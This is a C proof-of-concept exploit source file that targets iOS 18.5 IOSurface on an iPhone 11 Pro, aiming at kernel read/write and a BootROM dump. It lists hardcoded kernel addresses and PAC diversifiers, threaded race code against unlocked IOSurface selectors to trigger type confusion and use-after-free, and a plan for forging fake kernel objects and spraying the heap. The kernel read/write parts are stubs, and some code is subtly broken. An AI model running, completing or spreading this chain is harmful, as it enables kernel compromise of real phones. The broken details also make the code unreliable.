/*
 * iOS 18.5 (22F76) IOSurface → Kernel R/W → BootROM Dump PoC
 * =============================================================
 * Target: iPhone 11 Pro (iPhone12,3) / A13 Bionic (T8030)
 * Strategy: Type Confusion + Race Conditions (integer overflow blocked)
 *
 * ALL ADDRESSES FROM STATIC ANALYSIS OF iOS 18.5 KERNELCACHE
 * SHA256 prefix: 79b92c7dc5b0568b
 *
 * Chain: IOSurface property type confusion → fake object → kernel R/W
 *        → ml_phys_read(0x100000000) → BootROM dump
 *
 * Phase 9 findings:
 *   - s_set_value: NO LOCK, 3 AUTDA checks, vtable+0x128 dispatch
 *   - s_get_value: NO LOCK, 6 AUTDA checks, vtable+0x148 dispatch
 *   - s_set_value_xml: NO LOCK, different vtable offsets (0x118,0x128)
 *   - s_get_value_xml: HAS LOCK (CASA), 1 AUTDA check
 *   - s_bulk_get_value: NO LOCK, 6 AUTDA checks
 *   - CRITICAL: s_set_value and s_get_value have NO LOCKING
 *   - CRITICAL: Different vtable dispatch paths between XML and binary
 *
 * Build: clang -arch arm64 -framework IOKit -framework CoreFoundation \
 *        -o bootrom_dump chain_b_ios185_poc.m
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <pthread.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

// ============================================================
// iOS 18.5 (22F76) Kernel Addresses — iPhone 11 Pro
// ============================================================
#define KC_BASE                 0xfffffff007004000ULL

// IOSurface vtable & dispatch
#define IOSURFACE_VTABLE_VA     0xfffffff007e56618ULL
#define DISPATCH_TABLE_VA       0xfffffff007e56618ULL  // Same location
#define DISPATCH_STRIDE         24

// Dispatch function addresses (selector → handler)
#define S_CREATE_SURFACE        0xfffffff009e86024ULL  // sel 0
#define S_DELETE_SURFACE        0xfffffff0084ff664ULL  // sel 1
#define S_LOOKUP_SURFACE        0xfffffff0084ff418ULL  // sel 2
#define S_LOCK_SURFACE          0xfffffff0084ff390ULL  // sel 3
#define S_UNLOCK_SURFACE        0xfffffff0085630e8ULL  // sel 4
#define S_GET_VALUE             0xfffffff00857f3a4ULL  // sel 5
#define S_SET_VALUE             0xfffffff00857ee7cULL  // sel 6
#define S_INCREMENT_USE_COUNT   0xfffffff00861c8d0ULL  // sel 7
#define S_DECREMENT_USE_COUNT   0xfffffff00857e464ULL  // sel 8
#define S_SET_VALUE_XML         0xfffffff00857e1acULL  // sel 9
#define S_GET_VALUE_XML         0xfffffff00857dde8ULL  // sel 10
#define S_BULK_SET_VALUE        0xfffffff00857dba0ULL  // sel 11
#define S_BULK_GET_VALUE        0xfffffff00857d83cULL  // sel 12

// PAC diversities (from Phase 9)
#define PAC_VTABLE_DIV          0xcda1  // DA key — vtable pointer auth
#define PAC_RELEASE_DIV         0x3a87  // IA key — vtable+0x28 (release)
#define PAC_RETAIN_DIV          0x2e4a  // IA key — vtable+0x20 (retain)

// s_get_value vtable dispatch diversities
#define PAC_GET_DISPATCH1       0x5a20  // vtable+0x148 (property getter)
#define PAC_GET_DISPATCH2       0x4a6a  // vtable+0x68 (helper)
#define PAC_GET_DISPATCH3       0x1ac8  // vtable+0x??? (another helper)

// s_set_value vtable dispatch diversities
#define PAC_SET_DISPATCH1       0x5837  // vtable+0x128 (property container)
#define PAC_SET_DISPATCH2       0x8453  // vtable+0x118 (property setter)

// s_set_value_xml vtable dispatch diversities
#define PAC_XML_DISPATCH1       0x4578  // vtable+0x?? (xml handler)

// IOSurface code range
#define IOSURFACE_TEXT_START    0xfffffff009e676d0ULL
#define IOSURFACE_TEXT_END      0xfffffff009e954c8ULL

// IOSurface struct offsets (from disassembly)
#define OFF_ISA                 0x000   // vtable ptr (PAC-DA/0xcda1)
#define OFF_CONTAINER           0x010   // container pointer
#define OFF_INNER_OBJ           0x018   // inner object (used in s_set_value)
#define OFF_STORED_VAL          0x020   // stored value (retain target)
#define OFF_ALLOC_DESC          0x030
#define OFF_AUTH_PTR_50         0x050   // PAC auth ptr (in create)
#define OFF_WIDTH               0x058
#define OFF_HEIGHT              0x060
#define OFF_BYTES_PER_ELEM      0x078
#define OFF_ELEM_WIDTH          0x080
#define OFF_BYTES_PER_ROW       0x090
#define OFF_ALLOC_SIZE          0x098
#define OFF_USE_COUNT           0x088

// BootROM target
#define BOOTROM_PHYS_ADDR       0x100000000ULL
#define BOOTROM_SIZE            0x80000  // 512KB

// ============================================================
// IOSurface user client connection
// ============================================================
static io_connect_t g_iosurface_uc = 0;

int open_iosurface(void) {
    io_service_t service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching("IOSurfaceRoot")
    );
    if (!service) {
        printf("[-] IOSurfaceRoot not found\n");
        return -1;
    }
    
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &g_iosurface_uc);
    IOObjectRelease(service);
    
    if (kr != KERN_SUCCESS) {
        printf("[-] IOServiceOpen failed: 0x%x\n", kr);
        return -1;
    }
    
    printf("[+] IOSurfaceRootUserClient opened: 0x%x\n", g_iosurface_uc);
    return 0;
}

// ============================================================
// Surface creation
// ============================================================
uint32_t create_surface(uint32_t width, uint32_t height, uint32_t bpe, uint32_t bpr) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks
    );
    
    CFNumberRef w = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &width);
    CFNumberRef h = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &height);
    CFNumberRef b = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &bpe);
    CFNumberRef r = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &bpr);
    int32_t fmt = 0x42475241; // BGRA
    CFNumberRef f = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &fmt);
    int32_t alloc = width * height * bpe;
    CFNumberRef a = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &alloc);
    
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), w);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), h);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), b);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), r);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), f);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), a);
    
    CFDataRef data = IOCFSerialize(props, 0);
    if (!data) {
        printf("[-] IOCFSerialize failed\n");
        return 0;
    }
    
    uint64_t output[4] = {0};
    uint32_t outputCnt = 4;
    
    kern_return_t kr = IOConnectCallStructMethod(
        g_iosurface_uc,
        0, // s_create_surface
        CFDataGetBytePtr(data),
        CFDataGetLength(data),
        output,
        (size_t *)&outputCnt
    );
    
    CFRelease(data);
    CFRelease(props);
    CFRelease(w); CFRelease(h); CFRelease(b); CFRelease(r); CFRelease(f); CFRelease(a);
    
    if (kr != KERN_SUCCESS) {
        printf("[-] create_surface failed: 0x%x\n", kr);
        return 0;
    }
    
    uint32_t surface_id = (uint32_t)output[0];
    printf("[+] Created surface ID: %u\n", surface_id);
    return surface_id;
}

// ============================================================
// Property set/get (type confusion vectors)
// ============================================================
kern_return_t set_surface_value(uint32_t surface_id, const char *key, 
                                 const void *value, size_t value_len) {
    // Build binary property set request
    // Format: surface_id(4) + key_xml + value_xml
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks
    );
    
    CFStringRef cfkey = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
    CFDataRef cfval = CFDataCreate(kCFAllocatorDefault, value, value_len);
    CFDictionarySetValue(dict, cfkey, cfval);
    
    CFDataRef data = IOCFSerialize(dict, 0);
    
    // selector 6 = s_set_value
    struct {
        uint32_t surface_id;
        uint8_t padding[28]; // align to input struct
    } input = { .surface_id = surface_id };
    
    kern_return_t kr = IOConnectCallStructMethod(
        g_iosurface_uc,
        6,
        CFDataGetBytePtr(data),
        CFDataGetLength(data),
        NULL, NULL
    );
    
    CFRelease(data);
    CFRelease(dict);
    CFRelease(cfkey);
    CFRelease(cfval);
    
    return kr;
}

kern_return_t set_surface_value_xml(uint32_t surface_id, const char *xml_data, size_t xml_len) {
    // selector 9 = s_set_value_xml  
    // This takes raw XML serialized data
    kern_return_t kr = IOConnectCallStructMethod(
        g_iosurface_uc,
        9,
        xml_data,
        xml_len,
        NULL, NULL
    );
    return kr;
}

// ============================================================
// TYPE CONFUSION FUZZER
// ============================================================
/*
 * Phase 9 Key Finding:
 *   s_set_value uses vtable+0x128 (div 0x5837) and vtable+0x118 (div 0x8453)
 *   s_set_value_xml uses vtable+0x118 (div 0x4578) — DIFFERENT DIVERSITY!
 *   s_get_value uses vtable+0x148 (div 0x5a20)
 *
 *   The DIFFERENT dispatch diversities between set_value and set_value_xml
 *   mean they call different virtual methods. If set_value_xml stores an
 *   object with a different type expectation than get_value reads, we get
 *   type confusion.
 *
 *   Additionally: s_set_value, s_get_value, s_bulk_get_value all have
 *   NO LOCKING → race conditions are trivially achievable.
 */

typedef struct {
    uint32_t surface_id;
    volatile int running;
    volatile int type_confusion_detected;
} race_context_t;

void *race_setter_thread(void *arg) {
    race_context_t *ctx = (race_context_t *)arg;
    
    while (ctx->running) {
        // Alternate between setting OSNumber and OSData for same key
        int32_t number = 0x41414141;
        set_surface_value(ctx->surface_id, "fuzz_key", &number, sizeof(number));
        
        // Set as different type via XML
        const char *xml = "<dict><key>fuzz_key</key><string>BBBBBBBBBBBBBBBB</string></dict>";
        set_surface_value_xml(ctx->surface_id, xml, strlen(xml));
    }
    return NULL;
}

void *race_getter_thread(void *arg) {
    race_context_t *ctx = (race_context_t *)arg;
    
    while (ctx->running) {
        // Try to get value during type transition
        uint64_t output[32] = {0};
        uint32_t outputCnt = sizeof(output);
        
        struct {
            uint32_t surface_id;
            char key[64];
        } input;
        input.surface_id = ctx->surface_id;
        strlcpy(input.key, "fuzz_key", sizeof(input.key));
        
        kern_return_t kr = IOConnectCallStructMethod(
            g_iosurface_uc,
            5, // s_get_value
            &input, sizeof(input),
            output, (size_t *)&outputCnt
        );
        
        if (kr == KERN_SUCCESS && outputCnt > 0) {
            // Check if returned value looks corrupted
            // (e.g., OSNumber length but OSString data)
            // This indicates type confusion
        }
    }
    return NULL;
}

void fuzz_type_confusion(uint32_t surface_id) {
    printf("\n[*] === TYPE CONFUSION FUZZER ===\n");
    printf("[*] Target: surface %u\n", surface_id);
    printf("[*] Strategy: race s_set_value vs s_set_value_xml vs s_get_value\n");
    printf("[*] No locking on any of these selectors!\n\n");
    
    race_context_t ctx = {
        .surface_id = surface_id,
        .running = 1,
        .type_confusion_detected = 0
    };
    
    pthread_t setter, getter;
    pthread_create(&setter, NULL, race_setter_thread, &ctx);
    pthread_create(&getter, NULL, race_getter_thread, &ctx);
    
    // Run for 5 seconds
    sleep(5);
    ctx.running = 0;
    
    pthread_join(setter, NULL);
    pthread_join(getter, NULL);
    
    if (ctx.type_confusion_detected) {
        printf("[!!!] TYPE CONFUSION DETECTED!\n");
    } else {
        printf("[*] No crash in 5s — need more iterations or different key types\n");
    }
}

// ============================================================
// USE-AFTER-FREE via decrement race
// ============================================================
void *uaf_decrement_thread(void *arg) {
    race_context_t *ctx = (race_context_t *)arg;
    
    while (ctx->running) {
        // Rapidly decrement use count
        struct { uint32_t surface_id; } input = { ctx->surface_id };
        IOConnectCallStructMethod(
            g_iosurface_uc,
            8, // s_decrement_use_count (NO LOCK)
            &input, sizeof(input),
            NULL, NULL
        );
        
        // Immediately re-increment to keep alive
        IOConnectCallStructMethod(
            g_iosurface_uc,
            7, // s_increment_use_count (NO LOCK)  
            &input, sizeof(input),
            NULL, NULL
        );
    }
    return NULL;
}

// ============================================================
// KERNEL R/W PRIMITIVE (after achieving type confusion)
// ============================================================
/*
 * Once we have type confusion:
 * 1. Forge fake OSData object with controlled backing buffer pointer
 * 2. Use s_get_value to read from arbitrary kernel address
 * 3. Use s_set_value to write to arbitrary kernel address
 *
 * The fake object needs:
 *   - Valid PAC-signed vtable pointer (div 0xcda1, DA key)
 *   - Correct retain count
 *   - Backing buffer pointer = target address
 *   - Size field = read/write length
 *
 * For kernel R/W without PAC forgery:
 *   - Use heap feng shui to place fake object in known location
 *   - Spray IOSurface properties to control heap layout
 *   - Overwrite adjacent object's data pointer via OOB
 */

// Placeholder for the actual kernel R/W implementation
uint64_t kernel_read64(uint64_t addr) {
    // TODO: Implement after achieving type confusion primitive
    printf("[*] kernel_read64(0x%llx) — needs type confusion primitive\n", addr);
    return 0;
}

void kernel_write64(uint64_t addr, uint64_t value) {
    printf("[*] kernel_write64(0x%llx, 0x%llx) — needs type confusion primitive\n", addr, value);
}

// ============================================================
// BOOTROM DUMP
// ============================================================
void dump_bootrom(void) {
    printf("\n[*] === BOOTROM DUMP ===\n");
    printf("[*] Target: 0x%llx (%u KB)\n", BOOTROM_PHYS_ADDR, BOOTROM_SIZE / 1024);
    printf("[*] Requires: kernel R/W via type confusion or PAC bypass\n");
    printf("[*] Method: Call ml_phys_read kernel function via hijacked vtable\n\n");
    
    // Step 1: Leak kernel slide
    printf("[1] Leak kernel slide from IOSurface vtable pointer\n");
    
    // Step 2: Locate gPhysBase
    printf("[2] Read gPhysBase to validate physical addressing\n");
    
    // Step 3: Read BootROM
    printf("[3] ml_phys_read(0x%llx, buffer, 0x%x)\n", BOOTROM_PHYS_ADDR, BOOTROM_SIZE);
    
    // The actual dump would use the kernel R/W primitive:
    /*
    uint8_t *bootrom = malloc(BOOTROM_SIZE);
    for (uint64_t off = 0; off < BOOTROM_SIZE; off += 8) {
        uint64_t val = kernel_read64(BOOTROM_PHYS_ADDR + off);
        memcpy(bootrom + off, &val, 8);
    }
    
    FILE *f = fopen("bootrom_t8030.bin", "wb");
    fwrite(bootrom, 1, BOOTROM_SIZE, f);
    fclose(f);
    printf("[+] BootROM dumped to bootrom_t8030.bin\n");
    free(bootrom);
    */
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char **argv) {
    printf("=== iOS 18.5 (22F76) IOSurface PoC ===\n");
    printf("=== iPhone 11 Pro / A13 / T8030 ===\n\n");
    printf("KC_BASE: 0x%llx\n", KC_BASE);
    printf("IOSurface vtable: 0x%llx\n", IOSURFACE_VTABLE_VA);
    printf("s_create_surface: 0x%llx\n", S_CREATE_SURFACE);
    printf("s_set_value: 0x%llx\n", S_SET_VALUE);
    printf("s_get_value: 0x%llx\n", S_GET_VALUE);
    printf("s_set_value_xml: 0x%llx\n", S_SET_VALUE_XML);
    printf("PAC vtable div: 0x%x\n\n", PAC_VTABLE_DIV);
    
    if (open_iosurface() != 0) {
        return 1;
    }
    
    // Create target surface
    uint32_t sid = create_surface(256, 256, 4, 1024);
    if (!sid) {
        printf("[-] Failed to create surface\n");
        return 1;
    }
    
    // Run type confusion fuzzer
    fuzz_type_confusion(sid);
    
    // TODO: Once type confusion achieved:
    // 1. Build fake object with controlled pointers
    // 2. Establish kernel read/write
    // 3. Dump BootROM
    dump_bootrom();
    
    return 0;
}
